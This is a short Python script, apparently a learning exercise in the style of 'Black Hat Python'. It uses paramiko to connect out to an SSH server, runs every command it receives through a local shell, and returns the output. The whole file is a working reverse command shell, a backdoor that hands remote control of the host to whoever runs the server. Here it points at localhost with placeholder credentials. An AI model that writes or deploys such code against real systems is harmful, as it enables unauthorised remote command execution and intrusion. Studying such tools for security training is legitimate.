# -*- coding: utf-8 -*-
'''
@Author: fiyc
@Date : 2018-09-19 13:47
@FileName : bh_sshRcmd.py
@Description : 
    - 通过paramiko使用ssh
'''

import threading
import paramiko
import subprocess

def convert2Str(source):
    byte_type = type(b'byte')
    str_type = type('str')
    if type(source) == byte_type:
        return source.decode('gbk')
    
    return source

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)

    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        ssh_session.send(command)

        hello = convert2Str(ssh_session.recv(1024))
        print(hello)

        while True:
            command = convert2Str(ssh_session.recv(1024))

            try:
                cmd_output = subprocess.check_output(command, shell=True)
                cmd_output = convert2Str(cmd_output)

                if cmd_output == '':
                    cmd_output = 'no output'
                ssh_session.send(cmd_output)
            except Exception as ex:
                ssh_session.send(str(ex));
                pass
        
        client.close()
    
    return


ssh_command('127.0.0.1', 'fiyc', 'fiyc', 'ClientConnected')
